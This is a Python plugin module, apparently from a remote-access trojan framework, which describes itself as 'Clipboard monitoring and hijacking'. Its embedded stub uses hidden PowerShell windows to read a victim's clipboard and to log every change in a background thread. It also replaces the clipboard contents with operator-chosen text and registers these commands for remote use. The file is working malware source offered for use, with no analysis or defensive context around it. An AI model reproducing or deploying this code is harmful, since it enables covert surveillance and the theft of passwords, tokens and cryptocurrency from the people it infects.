PLUGIN = {"name": "clipboard", "desc": "Clipboard monitoring and hijacking", "deps": [], "size": 1.5}

STUB_CODE = r"""
_CREATE_NO_WINDOW = 0x08000000

def _get_clipboard_text():
    try:
        out = subprocess.check_output(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace").strip("\r\n ") or None
    except: return None

def _set_clipboard_text(text):
    try:
        safe = text.replace('"', '`"')
        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{safe}"'],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
    except: pass

def _cmd_clipboard_get(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Clipboard requires Windows"}
        text = _get_clipboard_text()
        if text:
            return {"data": text[:2000]}
        return {"output": "[!] No text on clipboard"}
    except Exception as e: return {"output": f"[!] Clipboard error: {e}"}

_clip_monitor_run = [False]
_clip_log = []

def _clip_monitor_thread():
    last = None
    while _clip_monitor_run[0]:
        try:
            text = _get_clipboard_text()
            if text and text != last:
                last = text
                _clip_log.append(text[:500])
        except: pass
        time.sleep(1)

def _cmd_clipboard_monitor(m):
    try:
        action = m.get("action", "start")
        if action == "start":
            if _clip_monitor_run[0]: return {"output": "[!] Clipboard monitor already running"}
            _clip_monitor_run[0] = True
            _clip_log.clear()
            threading.Thread(target=_clip_monitor_thread, daemon=True).start()
            return {"output": "[+] Clipboard monitor started"}
        elif action == "stop":
            _clip_monitor_run[0] = False
            return {"output": "[+] Clipboard monitor stopped"}
        elif action == "dump":
            logs = list(_clip_log)
            _clip_log.clear()
            return {"output": "\n".join(logs[-20:]) if logs else "[!] No clipboard captures"}
        return {"output": "[!] Use action=start/stop/dump"}
    except Exception as e: return {"output": f"[!] Clipboard monitor error: {e}"}

def _cmd_clipboard_set(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Clipboard requires Windows"}
        text = m.get("text", "")
        _set_clipboard_text(text)
        return {"output": f"[+] Clipboard set to: {text[:100]}"}
    except Exception as e: return {"output": f"[!] Clipboard set error: {e}"}

_CMDS["clipboard_get"] = _cmd_clipboard_get
_CMDS["clipboard_monitor"] = _cmd_clipboard_monitor
_CMDS["clipboard_set"] = _cmd_clipboard_set
"""

def get_commands():
    return {"clipboard_get": "_cmd_clipboard_get", "clipboard_monitor": "_cmd_clipboard_monitor", "clipboard_set": "_cmd_clipboard_set"}
